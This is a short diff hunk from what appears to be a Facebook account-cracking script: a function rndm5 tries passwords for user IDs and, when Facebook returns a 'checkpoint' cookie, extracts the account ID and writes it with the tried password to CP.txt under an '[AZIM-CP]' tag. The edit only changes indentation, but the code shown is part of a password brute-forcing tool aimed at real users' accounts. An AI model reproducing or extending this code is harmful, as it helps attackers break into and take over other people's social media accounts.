@@ -1452,12 +1452,12 @@ def rndm5(uid,passlist):
                                         oks.append(uidx)
                                         break
                         elif 'checkpoint' in fb_cookies:
-				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
-				uidx = coki[82:97]
-				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pas+'\033[0;97m')
-				open('CP.txt', 'a').write(uidx+'|'+pas+'\n')
-				cps.append(uidx)
-				break
+                                        coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                                        uidx = coki[82:97]
+                                        print('\033[1;31m [AZIM-CP] '+uidx+' | '+pas+'\033[0;97m')
+                                        open('CP.txt', 'a').write(uidx+'|'+pas+'\n')
+                                        cps.append(uidx)
+                                        break
                         else:
 				continue
 		loop+=1
